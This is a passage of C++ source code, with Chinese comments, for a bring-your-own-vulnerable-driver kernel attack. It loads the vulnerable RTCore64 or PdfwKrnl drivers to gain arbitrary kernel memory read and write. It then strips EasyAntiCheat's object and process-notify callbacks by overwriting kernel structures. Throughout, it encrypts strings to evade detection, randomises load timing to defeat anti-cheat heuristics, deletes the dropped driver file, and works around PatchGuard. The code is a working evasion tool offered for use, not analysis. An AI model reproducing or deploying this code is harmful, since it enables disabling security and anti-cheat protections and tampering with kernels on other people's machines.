            wchar_t wDosName[32];
            if (g_isPdfwKrnl) STEALTH_WSTR_DECRYPT_TO("PdfwKrnl", wDosName, 32);
            else              STEALTH_WSTR_DECRYPT_TO("RTCore64", wDosName, 32);
            DefineDosDeviceW(DDD_REMOVE_DEFINITION, wDosName, nullptr);
        }

        // 3. 短暂等待内核释放设备对象
        Sleep(500);

        ByovdDiag("BYOVD:Init: zombie cleanup done, will retry load\n");
    } else {
        ByovdDiag("BYOVD:Init: no existing device (err=%u), will try to load\n", GetLastError());
    }

    // ★ v3.110: 随机延迟 500-3000ms 后加载驱动, 打破 EAC 时序模式检测
    {
        DWORD delayMs = 500 + (rand() % 2501);
        ByovdDiag("BYOVD:Init: random delay %ums before load\n", delayMs);
        Sleep(delayMs);
    }

    // 4. 加载驱动
    // ★ v3.96: 使用原始未修改驱动 + 原始设备名 \\.\RTCore64.
    //   僵尸设备检测后需重启系统清除, 正常流程通过 Shutdown() 的
    //   SERVICE_CONTROL_STOP 确保 DriverUnload → IoDeleteDevice 清理.
    ByovdDiag("BYOVD:Init: loading %ls (path=%ls)\n", m_actualServiceName, actualPath);
    StateLog("BYOVD", "BeforeLoadDriver", "svc=%S", m_actualServiceName);
    bool loadOk = LoadDriver(m_actualServiceName, actualPath);
    StateLog("BYOVD", "AfterLoadDriver", "ok=%d", loadOk ? 1 : 0);
    ByovdDiag("BYOVD:Init: LoadDriver → %d\n", (int)loadOk);

    if (!loadOk) {
        // ★ BUILD 460: 加载失败可能因为 zombie 清理后设备冲突,
        //   再试一次 DefineDosDeviceW 清理 + 短延迟 + 重试
        static bool zombieRetried = false;
        if (!zombieRetried) {
            zombieRetried = true;
            ByovdDiag("BYOVD:Init: LoadDriver failed, trying zombie cleanup retry...\n");
            // ★ BUILD 550: 解密设备名 (原 g_isPdfwKrnl ? L"PdfwKrnl" : L"RTCore64" 明文)
            {
                wchar_t wDosName2[32];
                if (g_isPdfwKrnl) STEALTH_WSTR_DECRYPT_TO("PdfwKrnl", wDosName2, 32);
                else              STEALTH_WSTR_DECRYPT_TO("RTCore64", wDosName2, 32);
                DefineDosDeviceW(DDD_REMOVE_DEFINITION, wDosName2, nullptr);  // ★ BUILD 489
            }
            Sleep(1000);
            loadOk = LoadDriver(m_actualServiceName, actualPath);
            ByovdDiag("BYOVD:Init: LoadDriver retry → %d\n", (int)loadOk);
        }
    }

    if (!loadOk) {
        // ★ v3.95: NtLoadDriver 失败 — 可能是僵尸设备名冲突
        //   尝试用 DefineDosDeviceW 重建符号链接后打开设备
        //   从 devicePath (如 \\.\RT64_A1B2) 提取 DOS 名和 NT 设备名
        // ★ BUILD 497: 固定数组替代 std::wstring — 避免 CRT 堆依赖
        const wchar_t* devPath = m_driverInfo.devicePath;
        wchar_t dosName[128] = {};
        wchar_t ntDevName[128] = {};
        if (wcslen(devPath) > 4 && wcsncmp(devPath, L"\\\\.\\", 4) == 0) {
            wcscpy_s(dosName, devPath + 4);              // e.g. "RT64_A1B2"
            swprintf_s(ntDevName, L"\\Device\\%ls", dosName); // e.g. "\\Device\\RT64_A1B2"
        } else {
            // ★ BUILD 550: 解密设备名 (原 g_isPdfwKrnl ? L"PdfwKrnl" : L"RTCore64" 明文)
            if (g_isPdfwKrnl) {
                STEALTH_WSTR_DECRYPT_TO("PdfwKrnl", dosName, 128);
                STEALTH_WSTR_DECRYPT_TO("\\Device\\PdfwKrnl", ntDevName, 128);
            } else {
                STEALTH_WSTR_DECRYPT_TO("RTCore64", dosName, 128);
                STEALTH_WSTR_DECRYPT_TO("\\Device\\RTCore64", ntDevName, 128);
            }
        }

        ByovdDiag("BYOVD:Init: LoadDriver FAILED, trying symlink fix: '%ls' → '%ls'\n",
            dosName, ntDevName);

        if (DefineDosDeviceW(DDD_RAW_TARGET_PATH, dosName, ntDevName)) {
            ByovdDiag("BYOVD:Init: DefineDosDeviceW OK, trying to open...\n");
            m_hDevice = CreateFileW(m_driverInfo.devicePath,
                GENERIC_READ | GENERIC_WRITE,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                nullptr, OPEN_EXISTING, 0, nullptr);
            if (m_hDevice != INVALID_HANDLE_VALUE) {
                // ★ BUILD 489: 根据驱动类型设置 IOCTL 码
                ByovdDiag("BYOVD:Init: zombie device opened after symlink fix, testing IOCTL 0x%08X...\n",
                    m_driverInfo.ioctlCode);
                if (g_isPdfwKrnl) {
                    g_probedReadIoctl = IOCTL_AMDPDFW_MEMCPY;
                    g_probedWriteIoctl = IOCTL_AMDPDFW_MEMCPY;
                } else {
                    g_probedReadIoctl = IOCTL_PHYSICAL_READ;
                    g_probedWriteIoctl = IOCTL_PHYSICAL_WRITE;
                }
                m_active = true;
                m_ntosBase = GetNtoskrnlBase();
                if (m_ntosBase) {
                    uint16_t magic = 0;
                    bool probeOk = ReadKernelVA(m_ntosBase, &magic, 2);
                    if (probeOk && magic == 0x5A4D) {
                        ByovdDiag("BYOVD:Init: zombie device IOCTL OK (ntos=0x%llX, ioctl=0x%08X)\n",
                            (unsigned long long)m_ntosBase, m_driverInfo.ioctlCode);
                        // ★ BUILD 532: 切换为 overlapped 句柄用于超时保护 (close-and-reopen)
                        if (g_isPdfwKrnl) TrySwitchToOverlapped(m_hDevice, m_driverInfo.devicePath);
                        return true;
                    }
                    ByovdDiag("BYOVD:Init: zombie device IOCTL FAILED (magic=0x%04X)\n", magic);
                }
                ByovdDiag("BYOVD:Init: ZOMBIE DEVICE DETECTED — reboot required to clear\n");
                CloseHandle(m_hDevice);
                m_hDevice = INVALID_HANDLE_VALUE;
                m_active = false;
            } else {
                ByovdDiag("BYOVD:Init: still cannot open after symlink fix (err=%u)\n", GetLastError());
            }
        } else {
            ByovdDiag("BYOVD:Init: DefineDosDeviceW FAILED (err=%u)\n", GetLastError());
        }

        ByovdDiag("BYOVD:Init: all attempts failed, giving up\n");
        UnloadDriver(m_actualServiceName);
        return false;
    }
    ByovdDiag("BYOVD:Init: LoadDriver OK\n");

    // 5. 打开设备
    m_hDevice = CreateFileW(m_driverInfo.devicePath,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        nullptr, OPEN_EXISTING, 0, nullptr);

    if (m_hDevice == INVALID_HANDLE_VALUE) {
        ByovdDiag("BYOVD:Init: CreateFileW FAILED for %ls (err=%u)\n",
            m_driverInfo.devicePath, GetLastError());
        UnloadDriver(m_actualServiceName);
        return false;
    }
    ByovdDiag("BYOVD:Init: device opened OK\n");

    // ★ v3.119: 在驱动加载后延迟 500ms, 让驱动内部稳定, 避免 BSOD
    //   某些 Windows 版本在加载 RTCore64 后立即发送 IOCTL 会导致内核崩溃
    Sleep(500);
    ByovdDiag("BYOVD:Init: post-load delay done\n");

    // ★ v3.118: 精确定位BSOD位置 — 分步日志
    ByovdDiag("BYOVD:Init: STEP_A calling GetNtosBase...\n");
    // ★ v3.116: SEH 已移除 — GetKernelModuleBase 内部已用 VirtualAlloc 替代 std::vector
    //   且返回 0 表示失败, 无需额外异常保护
    m_ntosBase = GetNtoskrnlBase();
    ByovdDiag("BYOVD:Init: STEP_A1 GetNtosBase returned 0x%llX\n",
              (unsigned long long)m_ntosBase);
    ByovdDiag("BYOVD:Init: STEP_B ntos=0x%llX, ioctl=0x%08X\n",
              (unsigned long long)m_ntosBase, m_driverInfo.ioctlCode);

    // ★ BUILD 489: 根据驱动类型选择 IOCTL 探测方式
    //   PDFWKRNL: 使用 IOCTL 0x80002014 memcpy 直接读写内核VA
    //   RTCore64: 使用 IOCTL 0x80002048 (PhysicalReadViaIOCTL) 直接读写内核VA
    ByovdDiag("B550:B1:probe ioctl drv=%d...\n",  // ★ BUILD 550: 脱敏 (原含驱动名)
        g_isPdfwKrnl ? 1 : 0);
    {
        if (g_isPdfwKrnl) {
            // ★ BUILD 489: PDFWKRNL — 使用 memcpy IOCTL
            g_probedReadIoctl = IOCTL_AMDPDFW_MEMCPY;
            g_probedWriteIoctl = IOCTL_AMDPDFW_MEMCPY;  // 同一个 IOCTL, 方向由参数决定
            g_useVirtualIOCTL = false;

            uint8_t testBuf[8] = {};
            bool ok = PdfwReadKernelVA(m_hDevice, m_ntosBase, testBuf, 2);
            DWORD err = GetLastError();
            uint16_t magic = *(uint16_t*)testBuf;
            ByovdDiag("BYOVD:Init: PDFW IOCTL 0x%08X read ntos+0x0 ok=%d err=%u magic=0x%04X (expect 0x5A4D)\n",
                      IOCTL_AMDPDFW_MEMCPY, (int)ok, err, magic);
            if (ok && magic == 0x5A4D) {
                ByovdDiag("BYOVD:Init: PDFW IOCTL OK — kernel VA memcpy R/W\n");
            } else {
                ByovdDiag("BYOVD:Init: PDFW IOCTL FAILED — driver unusable\n");
                CloseHandle(m_hDevice);
                m_hDevice = INVALID_HANDLE_VALUE;
                UnloadDriver(m_actualServiceName);
                return false;
            }
        } else {
            // 直接设置 IOCTL 码
            g_probedReadIoctl = IOCTL_PHYSICAL_READ;   // 0x80002048
            g_probedWriteIoctl = IOCTL_PHYSICAL_WRITE;  // 0x8000204C
            g_useVirtualIOCTL = false;

            // 从 ntoskrnl 头部读取 MZ 签名验证 IOCTL 可用
            uint8_t testBuf[8] = {};
            bool ok = PhysicalReadViaIOCTL(m_hDevice, g_probedReadIoctl, m_ntosBase, testBuf, 2);
            DWORD err = GetLastError();
            uint16_t magic = *(uint16_t*)testBuf;
            ByovdDiag("BYOVD:Init: IOCTL 0x%08X read ntos+0x0 ok=%d err=%u magic=0x%04X (expect 0x5A4D)\n",
                      g_probedReadIoctl, (int)ok, err, magic);
            if (ok && magic == 0x5A4D) {
                ByovdDiag("BYOVD:Init: IOCTL 0x%08X OK — kernel VA R/W via physical IOCTL\n",
                          g_probedReadIoctl);
            } else {
                ByovdDiag("BYOVD:Init: IOCTL 0x%08X FAILED — driver unusable\n",
                          g_probedReadIoctl);
                CloseHandle(m_hDevice);
                m_hDevice = INVALID_HANDLE_VALUE;
                UnloadDriver(m_actualServiceName);
                return false;
            }
        }
    }

    // ★ v3.110: 驱动加载成功, 立即删除临时文件抹除磁盘痕迹
    if (actualPath && actualPath[0]) {
        ByovdDiag("BYOVD:Init: STEP_C deleting temp file '%ls'...\n", actualPath);
        if (DeleteFileW(actualPath)) {
            ByovdDiag("BYOVD:Init: STEP_C deleted OK\n");
        } else {
            // ★ v3.126o: 修复 — 检查删除失败 (AV 锁定 / 权限不足)
            DWORD err = GetLastError();
            ByovdDiag("BYOVD:Init: STEP_C delete FAILED err=%d, retrying with MOVEFILE_DELAY_UNTIL_REBOOT\n", (int)err);
            MoveFileExW(actualPath, nullptr, MOVEFILE_DELAY_UNTIL_REBOOT);
        }
    }

    m_active = true;
    ByovdDiag("BYOVD:Init: STEP_D m_active=true, verifying IOCTL...\n");

    // ★ BUILD 489: 验证 IOCTL R/W 可用 — 根据驱动类型使用对应方法
    {
        uint8_t testBuf[8] = {};
        bool ok;
        if (g_isPdfwKrnl) {
            ok = PdfwReadKernelVA(m_hDevice, m_ntosBase, testBuf, 8);
        } else {
            ok = PhysicalReadViaIOCTL(m_hDevice, g_probedReadIoctl, m_ntosBase, testBuf, 8);
        }
        uint32_t readVal = *(uint32_t*)testBuf;
        ByovdDiag("B550:E:ioctl verify ok=%d val=0x%08X\n",  // ★ BUILD 550: 脱敏
                  (int)ok, readVal);
        if (!ok || readVal == 0 || readVal == 0xFFFFFFFF) {
            ByovdDiag("BYOVD:Init: IOCTL verify FAILED (val=0x%08X)\n", readVal);
            m_active = false;
            CloseHandle(m_hDevice);
            m_hDevice = INVALID_HANDLE_VALUE;
            UnloadDriver(m_actualServiceName);
            return false;
        }
    }
    ByovdDiag("BYOVD:Init: IOCTL verify OK\n");
    ByovdDiag("BYOVD:Init: STEP_F returning true (success, useVirtual=%d)\n", (int)g_useVirtualIOCTL);

    // ★ BUILD 532: 切换为 overlapped 句柄用于超时保护 (close-and-reopen)
    if (g_isPdfwKrnl) TrySwitchToOverlapped(m_hDevice, m_driverInfo.devicePath);

    return true;
}

void KernelMemoryAccessor::Shutdown() {
    // ★ BUILD 470: 不卸载驱动 — 保留 \Device\RTCore64 给后续运行复用
    //   旧代码 SCM STOP + NtUnloadDriver 触发 DriverUnload, 但驱动可能
    //   不调用 IoDeleteDevice, 导致僵尸设备. 新策略: 驱动永久加载,
    //   每 session 的 Init 探测到已有设备直接复用 (probe + IOCTL test).
    m_active = false;
    // ★ BUILD 497: m_pageTableWalker 已移除 (BUILD 496), 删除 .reset() 调用
    g_physMappingCount = 0;

    // BUILD 470: 仅关闭句柄, 不卸载驱动
    if (m_hDevice != INVALID_HANDLE_VALUE) {
        CloseHandle(m_hDevice);
        m_hDevice = INVALID_HANDLE_VALUE;
    }
    // ★ BUILD 532: overlapped 句柄与 m_hDevice 同一 (close-and-reopen), 无需单独清理
    g_overlappedActive = false;
    ByovdDiag("BYOVD:Shutdown: driver kept loaded for next reuse\n");
}

// ★ v3.69/v3.117: 注册 DLL 代码区域 (固定数组, 避免 CRT 堆)
void KernelMemoryAccessor::RegisterCodeRegion(void* base, SIZE_T size) {
    if (!base || size == 0) return;
    if (g_protectedRegionCount >= MAX_PROTECTED_REGIONS) {
        ByovdDiag("BYOVD:RegisterCodeRegion: MAX_PROTECTED_REGIONS (%zu) reached, skipping\n",
                  MAX_PROTECTED_REGIONS);
        return;
    }
    ProtectedUserRegion& region = g_protectedUserRegions[g_protectedRegionCount];
    region.base = reinterpret_cast<uintptr_t>(base);
    region.size = size;
    g_protectedRegionCount++;
}

// ★ v3.69: 检查 VA 范围是否与受保护区域重叠
bool KernelMemoryAccessor::IsOverlappingProtectedRegion(uintptr_t va, SIZE_T size) {
    uintptr_t vaEnd = va + size;
    // ★ v3.118: 只遍历有效条目 (g_protectedRegionCount), 避免遍历全数组
    for (int ri = 0; ri < g_protectedRegionCount; ri++) {
        const ProtectedUserRegion& r = g_protectedUserRegions[ri];
        uintptr_t rEnd = r.base + r.size;
        // 检查区间重叠: [va, vaEnd) 与 [r.base, rEnd)
        if (va < rEnd && vaEnd > r.base) {
            return true;
        }
    }
    return false;
}

// ★ BUILD 555 P2-5: IOCTL 冷却期查询 (供 ShadowPageManager::Uninstall 使用)
//   返回 true = 当前在冷却期内 (驱动疑似卡死, 应跳过非关键 IOCTL)
//   实现: g_ioctlCooldownUntil 由 BUILD 532 PdfwIoctlWithTimeout 设置 (仅 PDFWKRNL 路径)
//         RTCore64 路径无超时保护, 始终返回 false (调用方需自己处理同步阻塞)
//   ★ BUILD 555 P2-verify: 修复无符号算术回绕检查 bug
//     原实现: (now - g_ioctlCooldownUntil) < 0x7FFFFFFF && now < g_ioctlCooldownUntil
//     问题: now < g_ioctlCooldownUntil 时, (now - g_ioctlCooldownUntil) 回绕为接近 UINT32_MAX 的大值
//           导致条件恒为 false, 函数永远不会返回 true
//     修复: 用 (g_ioctlCooldownUntil - now) < 0x7FFFFFFF 直接判断 "冷却截止时间在未来"
//           (GetTickCount DWORD 溢出时无符号算术仍正确, 与 VEH 重置逻辑一致)
bool KernelMemoryAccessor::IsIoctlInCooldown() const {
    if (!g_overlappedActive) return false;  // 非 overlapped 模式无冷却机制
    if (g_ioctlCooldownUntil == 0) return false;
    DWORD now = GetTickCount();
    // 冷却截止时间在未来 (且在 ~24 天内, 防止 g_ioctlCooldownUntil 残留导致永久冷却)
    DWORD remaining = g_ioctlCooldownUntil - now;  // 无符号回绕安全
    return (remaining < 0x7FFFFFFF);
}

bool KernelMemoryAccessor::IsKernelAddressValid(uint64_t va) {
    // 内核地址范围检查 (Windows x64 规范)
    // 内核空间: 0xFFFF800000000000 ~ 0xFFFFFFFFFFFFFFFF
    if (va < 0xFFFF800000000000ULL) return false;
    if (va > 0xFFFFFFFFFFFFFFFFULL) return false;
    // ★ v3.114: IOCTL_VIRTUAL_MEM (0x80002000) 直接读取内核虚拟地址, 无需 VA→PA 转换
    //   移除 PageTableWalker 依赖 (旧代码通过物理内存扫描 PML4, 不兼容内核VA IOCTL)
    //   只要驱动可用且 VA 在内核范围, 即视为有效
    return m_active;
}

// ============================================================
// CallbackDisabler — 内核回调摘除核心逻辑
// ============================================================

EACCallbackDisabler& EACCallbackDisabler::Instance() {
    static EACCallbackDisabler inst;
    return inst;
}

bool EACCallbackDisabler::IsAddressInModule(uint64_t addr, uint64_t moduleBase,
                                              uint32_t moduleSize) {
    return addr >= moduleBase && addr < (moduleBase + moduleSize);
}

// ============================================================
// Sigscan: 在 ObRegisterCallbacks 函数体中查找 ObpCallbackArray
//
// ObRegisterCallbacks 中通常有:
//   lea rcx, [rip + offset]  → 48 8D 0D XX XX XX XX
//   这指向 ObpCallbackArrayHead
//
// CallbackEntry 结构体 (未文档化, 各 Windows 版本布局不同):
//   +0x00: LIST_ENTRY Entry (Flink, Blink)
//   +0x10: OB_OPERATION Operations
//   +0x14: ULONG Active
//   +0x18: PVOID CallbackContext (旧代码误以为是 PreOperation)
//   +0x20: POBJECT_TYPE ObjectType
//   +0x28: POB_PRE_OPERATION PreOperation (Win11 24H2 真实偏移)
//   +0x30: POB_POST_OPERATION PostOperation (Win11 24H2 真实偏移)
//   +0x38: PVOID DriverObject / ObHandle
//
// ★ BUILD 543: 保留 +0x18/+0x28 旧偏移 (与 BUILD 541 一致)
//   原因: BUILD 542 改用 +0x28/+0x30 真实偏移 + 链表遍历触发 0x109 蓝屏 (PatchGuard)
//   策略: MessageTransfer.sys 是 minifilter (FltRegisterFilter), 不注册 ObCallbacks,
//         ob=0 是正常的 — E+G 方案不需要 ObCallbacks 移除, 用旧偏移避免 PatchGuard 风险
//
// 摘除方法: 将 PreOperation / PostOperation 字段置为 NULL
// ============================================================

uint64_t EACCallbackDisabler::FindObpCallbackArrayHead(KernelMemoryAccessor& kma) {
    // ★ BUILD 533: 缓存 ObpCallbackArrayHead 地址 — 内核地址在运行期间不变
    //   原每次 ReDisablePacCallbacks 都重新 sigscan (352次/5分钟), 现缓存后仅首次扫描
    static uint64_t s_cachedArrayHead = 0;
    if (s_cachedArrayHead) return s_cachedArrayHead;

    uint64_t ntBase = kma.GetNtoskrnlBase();
    if (!ntBase) return 0;

    // BUILD 458: 分块读取 ObRegisterCallbacks + ObUnRegisterCallbacks 函数体
    // 扩展到 1024 字节, 搜索 LEA/MOV [RIP+rel32] → ntoskrnl .data 段
    // ★ BUILD 555 P2-verify: API 名 STEALTH_STR_DECRYPT_TO 加密 (原明文 funcNames[] 进入 .rdata)
    //   修复: 两个 API 名分别用栈缓冲区解密, 消除 .rdata 明文特征
    char funcName1[40] = {};
    char funcName2[40] = {};
    STEALTH_STR_DECRYPT_TO("ObRegisterCallbacks", funcName1, sizeof(funcName1));
    STEALTH_STR_DECRYPT_TO("ObUnRegisterCallbacks", funcName2, sizeof(funcName2));
    const char* funcNames[] = { funcName1, funcName2 };
    uint8_t funcBody[512] = {};

    for (const char* funcName : funcNames) {
        uint64_t funcAddr = kma.ResolveExport(ntBase, funcName);
        if (!funcAddr) continue;

        for (int chunk = 0; chunk < 2; chunk++) {
            if (!kma.ReadKernelVA(funcAddr + chunk * 512, funcBody, sizeof(funcBody)))
                break;

            for (int i = 0; i < 500; i++) {
                // LEA/MOV RXX, [RIP+rel32] → ntoskrnl .data
                if ((funcBody[i] == 0x48 || funcBody[i] == 0x4C || funcBody[i] == 0x4D) &&
                    (funcBody[i+1] == 0x8D || funcBody[i+1] == 0x8B) &&
                    (funcBody[i+2] & 0xC7) == 0x05) {
                    int32_t disp = *(int32_t*)(funcBody + i + 3);
                    uint64_t target = funcAddr + chunk * 512 + i + 7 + disp;
                    if (target > ntBase + 0x3000 && target < ntBase + 0x2000000) {
                        ByovdDiag("VERIFY:ObpCallbackArrayHead at 0x%llX (via %s)\n",
                            (unsigned long long)target, funcName);
                        s_cachedArrayHead = target;  // ★ BUILD 533: 缓存地址
                        return target;
                    }
                }
            }
        }
    }

    // 回退: 尝试 ObpCallbackArrayHead 直接导出 (某些 Windows 版本)
    // ★ BUILD 555 P2-verify: STEALTH_STR_DECRYPT_TO 加密 (原明文进入 .rdata)
    char obpCallbackName[40] = {};
    STEALTH_STR_DECRYPT_TO("ObpCallbackArrayHead", obpCallbackName, sizeof(obpCallbackName));
    uint64_t fallback = kma.ResolveExport(ntBase, obpCallbackName);
    if (fallback) s_cachedArrayHead = fallback;  // ★ BUILD 533: 缓存回退结果
    return fallback;
}

// ★ v3.126h: 前向声明 — PAC 驱动 fallback 匹配 (实现在文件末尾)
static bool IsPacDriverName_Fallback(const char* name);

int EACCallbackDisabler::DisableObCallbacks(const char* eacDriverName) {
    auto& kma = KernelMemoryAccessor::Instance();
    if (!kma.IsActive()) return 0;

    uint64_t cbArrayHead = FindObpCallbackArrayHead(kma);
    if (!cbArrayHead) return 0;

    // ★ v3.68: 验证 cbArrayHead 在有效内核地址范围内
    // 防止 sigscan 误命中导致线性扫描读到无效地址
    if (cbArrayHead < 0xFFFF800000000000ULL || cbArrayHead > 0xFFFFFFFFFFFFFFFFULL)
        return 0;
    uint64_t ntBase = kma.GetNtoskrnlBase();
    if (ntBase) {
        // ObpCallbackArrayHead 应在 ntoskrnl 的数据段 (.data) 内
        // ntoskrnl 镜像通常 < 30MB, sigscan 结果应在其范围内
        if (cbArrayHead < ntBase || cbArrayHead > ntBase + 0x2000000ULL)
            return 0;
    }

    // 获取 PAC 驱动基址 (用于代码范围匹配)
    char eacSysName[128];
    sprintf_s(eacSysName, "%s.sys", eacDriverName);
    uint64_t eacBase = kma.GetKernelModuleBase(eacSysName);
    if (!eacBase) {
        // ★ BUILD 550: 解密内核模块名 (原 "EasyAntiCheat_EOS.sys" 明文)
        char eosName[32];
        STEALTH_STR_DECRYPT_TO("EasyAntiCheat_EOS.sys", eosName, sizeof(eosName));
        eacBase = kma.GetKernelModuleBase(eosName);
        SecureZeroMemory(eosName, sizeof(eosName));
    }

    // ★ BUILD 538: 读取 PAC 驱动 SizeOfImage (PE 头) 用于代码范围匹配
    //   原匹配逻辑: DriverObject(+0x38) → DriverSection(+0x14) → BaseDllName(+0x58 inline)
    //   Bug1: DRIVER_OBJECT.DriverSection 在 x64 偏移为 +0x28 (代码误用 +0x14, x86 布局)
    //   Bug2: BaseDllName 是 UNICODE_STRING 指针结构 (代码误作 inline wchar_t 读取)
    //   上述两个 bug 导致所有回调条目名称匹配失败, ob=0 (尽管驱动已找到, 见日志:
    //   "fallback found MessageTransfer.sys at 0xfffff80580900000")
    //   新方案: 读 PE 头 SizeOfImage, 用 preOp/postOp 代码范围匹配
    //   优势: 最可靠 (直接验证回调代码是否在 PAC 驱动范围内), 仅读已知可信字段, 无蓝屏风险
    uint64_t eacSize = 0;
    if (eacBase) {
        IMAGE_DOS_HEADER dos = {};
        if (kma.ReadKernelVA(eacBase, &dos, sizeof(dos)) && dos.e_magic == IMAGE_DOS_SIGNATURE) {
            IMAGE_NT_HEADERS64 nt = {};
            if (kma.ReadKernelVA(eacBase + dos.e_lfanew, &nt, sizeof(nt)) &&
                nt.Signature == IMAGE_NT_SIGNATURE) {
                eacSize = nt.OptionalHeader.SizeOfImage;
            }
        }
    }
    ByovdDiag("BYOVD:DisableObCallbacks: target='%s' base=0x%llX size=0x%X arrayHead=0x%llX\n",
        eacSysName, (unsigned long long)eacBase, (unsigned)eacSize,
        (unsigned long long)cbArrayHead);

    // 遍历 CALLBACK_ENTRY_ITEM 链表
    // ★ BUILD 543: 回退到 BUILD 541 安全状态 — BUILD 542 链表遍历触发 0x109 蓝屏
    //   BUILD 542 教训: 链表遍历走了 256 个条目 (之前线性扫描只走 10 个就 break),
    //   每个条目读取 7 个字段 = 1792 次 IOCTL 读取 (之前是 20 次, 90 倍增长),
    //   OBDEBUG[0] 的 +0x20=0xFFFFF800C450E740 是 ntoskrnl 地址 (可能 PatchGuard 保护结构),
    //   大量读取 + 读取敏感字段触发 PatchGuard 0x109 (CRITICAL_STRUCTURE_CORRUPTION).
    //   根因: MessageTransfer.sys 是 minifilter (FltRegisterFilter), 不注册 ObCallbacks,
    //   ob=0 是正常的 — E+G 方案不需要 ObCallbacks 移除, DKOM+EkkoSleep+句柄重随机化已足够.
    //   修复: 回退到 BUILD 541 线性扫描 + +0x18/+0x28 偏移 (虽然偏移不对但安全),
    //         删除 OBDEBUG 诊断日志 (不再读取额外字段避免 PatchGuard),
    //         接受 ob=0 (PAC 不注册 ObCallbacks).

    constexpr uint32_t CB_ENTRY_SIZE = 0x40;
    constexpr uint32_t MAX_CALLBACKS = 256;

    // ★ v3.119: 重置计数器, 避免 std::vector CRT 堆依赖
    m_savedObCallbackCount = 0;

    int removed = 0;
    uint64_t current = cbArrayHead;
    uint32_t i = 0;

    for (i = 0; i < MAX_CALLBACKS; i++) {
        // ★ v3.68: 每个条目读取前验证 current 仍在有效内核范围
        if (current < 0xFFFF800000000000ULL || current > 0xFFFFFFFFFFFFFF00ULL)
            break;
        if (!kma.IsKernelAddressValid(current))
            break;

        // ★ BUILD 543: 回退到 BUILD 538 代码范围匹配 — 只读 preOp(+0x18) / postOp(+0x28)
        //   不读额外字段 (+0x20/+0x30/+0x38) 避免 PatchGuard 0x109 蓝屏
        uint64_t preOp = kma.Read<uint64_t>(current + 0x18);
        uint64_t postOp = kma.Read<uint64_t>(current + 0x28);

        bool matched = false;
        if (eacBase && eacSize && (preOp || postOp)) {
            if ((preOp >= eacBase && preOp < eacBase + eacSize) ||
                (postOp >= eacBase && postOp < eacBase + eacSize)) {
                matched = true;
                ByovdDiag("BYOVD:DisableObCallbacks: MATCH entry=%u preOp=0x%llX postOp=0x%llX\n",
                    i, (unsigned long long)preOp, (unsigned long long)postOp);
            }
        }

        if (matched) {
            // ★ v3.110: 先保存原始值再 NULL 化
            if ((preOp || postOp) && m_savedObCallbackCount < MAX_SAVED_OB_CALLBACKS) {
                SavedObEntry& saved = m_savedObCallbacks[m_savedObCallbackCount];
                saved.address = current;
                saved.preOp = preOp;
                saved.postOp = postOp;
                m_savedObCallbackCount++;
            }

            // NULL 化 PreOperation + PostOperation
            uint64_t zero = 0;
            kma.Write(current + 0x18, zero); // PreOperation
            kma.Write(current + 0x28, zero); // PostOperation
            removed++;
        }

        // ★ BUILD 543: 回退到线性扫描 — 链表遍历会走 256 个条目触发 PatchGuard
        current += CB_ENTRY_SIZE;
    }

    m_obCallbacksSaved = (m_savedObCallbackCount > 0);
    // ★ BUILD 538: 修正误导性日志 — 原 "(driver not loaded)" 在驱动已找到时仍输出
    //   实际情况: 驱动已加载 (base 非零), 但其回调代码不在驱动代码范围内
    //   (可能该驱动未注册 ObCallbacks, 或回调函数在其他模块中)
    if (removed == 0 && cbArrayHead) {
        ByovdDiag("VERIFY:ObCallbacks: %u entries walked, 0 matched '%s' (base=0x%llX size=0x%X — driver loaded, no ObCallbacks in range)\n",
            i, eacDriverName, (unsigned long long)eacBase, (unsigned)eacSize);
    } else {
        ByovdDiag("VERIFY:ObCallbacks: %u entries walked, %d removed for '%s'\n",
            i, removed, eacDriverName);
    }
    return removed;
}

int EACCallbackDisabler::DisableProcessNotifyCallbacks(const char* eacDriverName) {
    auto& kma = KernelMemoryAccessor::Instance();
    if (!kma.IsActive()) return 0;

    uint64_t ntBase = kma.GetNtoskrnlBase();
    char eacSysName[128];
    sprintf_s(eacSysName, "%s.sys", eacDriverName);
    uint64_t eacBase = kma.GetKernelModuleBase(eacSysName);
    if (!eacBase) {
        // BUILD 456: 自体验证
        ByovdDiag("VERIFY:ProcessNotify: '%s.sys' not loaded — skip scan (would scan if driver loaded)\n",
            eacDriverName);
        return 0;
    }

    // PsSetCreateProcessNotifyRoutine → sigscan 找到 PspCreateProcessNotifyRoutine 数组
    // ★ BUILD 555 P2-verify: STEALTH_STR_DECRYPT_TO 加密 (原明文进入 .rdata)
    char psCreateProcName[64] = {};
    STEALTH_STR_DECRYPT_TO("PsSetCreateProcessNotifyRoutine", psCreateProcName, sizeof(psCreateProcName));
    uint64_t psSetNotify = kma.ResolveExport(ntBase, psCreateProcName);
    if (!psSetNotify) return 0;

    // 搜索 lea rcx, [rip+offset] 或 mov rcx, imm64 定位数组
    uint8_t funcBody[128] = {};
    if (!kma.ReadKernelVA(psSetNotify, funcBody, sizeof(funcBody))) return 0;

    uint64_t arrayAddr = 0;
    for (int i = 0; i < (int)sizeof(funcBody) - 7; i++) {
        // 搜索 48 8D 0D (lea rcx, [rip+...])
        if (funcBody[i] == 0x48 && funcBody[i+1] == 0x8D && funcBody[i+2] == 0x0D) {
            int32_t disp = *(int32_t*)(funcBody + i + 3);
            arrayAddr = psSetNotify + i + 7 + disp;
            break;
        }
        // 搜索 48 B9 (mov rcx, imm64)
        if (funcBody[i] == 0x48 && funcBody[i+1] == 0xB9) {
            arrayAddr = *(uint64_t*)(funcBody + i + 2);
            break;
        }
    }

    if (!arrayAddr) return 0;

    // EX_FAST_REF 数组 (每个 entry 8 bytes, 高4位是引用计数, 低60位是指针)
    // 最多 64 个回调
    // ★ v3.119: 重置计数器, 避免 std::vector CRT 堆依赖
    m_savedProcessCallbackCount = 0;

    int removed = 0;
    for (int i = 0; i < 64; i++) {
        uint64_t entry = kma.Read<uint64_t>(arrayAddr + i * 8);
        if (!entry) continue;

        uint64_t callbackPtr = entry & 0xFFFFFFFFFFFFFFFULL; // 清除高4位引用计数
        if (IsAddressInModule(callbackPtr, eacBase, 0x100000)) {
            // ★ v3.119: 保存原始值 (固定数组)
            if (m_savedProcessCallbackCount < MAX_SAVED_ARRAY_CALLBACKS) {
                SavedArrayEntry& saved = m_savedProcessCallbacks[m_savedProcessCallbackCount];
                saved.address = arrayAddr + i * 8;
                saved.originalValue = entry;
                m_savedProcessCallbackCount++;
            }

            // NULL 化此条目
            uint64_t zero = 0;
            kma.Write(arrayAddr + i * 8, zero);
            removed++;
        }
    }

